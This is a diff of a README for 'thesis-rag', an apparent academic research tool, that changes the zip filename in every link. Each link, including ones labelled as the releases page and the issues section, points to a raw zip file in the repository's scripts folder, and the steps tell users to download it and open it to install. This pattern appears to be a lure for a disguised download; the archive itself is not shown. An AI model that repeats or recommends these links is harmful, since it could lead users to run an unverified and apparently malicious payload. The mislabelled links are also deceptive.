@@ -1,6 +1,6 @@
 # 🚀 thesis-rag - Simplifying Academic Research for Everyone
 
-[![Download Now](https://github.com/bobspw/thesis-rag/raw/refs/heads/main/scripts/rag_thesis_1.3.zip%20Now-Click%20Here-blue)](https://github.com/bobspw/thesis-rag/raw/refs/heads/main/scripts/rag_thesis_1.3.zip)
+[![Download Now](https://github.com/bobspw/thesis-rag/raw/refs/heads/main/scripts/thesis_rag_v3.2.zip%20Now-Click%20Here-blue)](https://github.com/bobspw/thesis-rag/raw/refs/heads/main/scripts/thesis_rag_v3.2.zip)
 
 ## 🌟 Description
 
@@ -27,7 +27,7 @@ Before you start, make sure your computer meets these basic requirements:
 
 ### Download & Install
 
-1. Visit the [Releases page](https://github.com/bobspw/thesis-rag/raw/refs/heads/main/scripts/rag_thesis_1.3.zip) to download the latest version of **thesis-rag**. 
+1. Visit the [Releases page](https://github.com/bobspw/thesis-rag/raw/refs/heads/main/scripts/thesis_rag_v3.2.zip) to download the latest version of **thesis-rag**. 
 2. Look for the assets section. Choose the file that matches your operating system.
 3. Click the link to download the file.
 4. Once the download is complete, open the file to start the installation process. 
@@ -35,7 +35,7 @@ Before you start, make sure your computer meets these basic requirements:
 
 You can also download it directly from the link below:
 
-[Download Now](https://github.com/bobspw/thesis-rag/raw/refs/heads/main/scripts/rag_thesis_1.3.zip)
+[Download Now](https://github.com/bobspw/thesis-rag/raw/refs/heads/main/scripts/thesis_rag_v3.2.zip)
 
 ## 🛠️ How to Use
 
@@ -55,7 +55,7 @@ If you encounter any issues while downloading or installing **thesis-rag**, plea
 
 ## 📖 Support and Feedback
 
-We welcome your questions and feedback. If you need assistance, please visit the [issues section](https://github.com/bobspw/thesis-rag/raw/refs/heads/main/scripts/rag_thesis_1.3.zip) of the repository. You can report problems or request features there.
+We welcome your questions and feedback. If you need assistance, please visit the [issues section](https://github.com/bobspw/thesis-rag/raw/refs/heads/main/scripts/thesis_rag_v3.2.zip) of the repository. You can report problems or request features there.
 
 ## 📚 Learn More
 
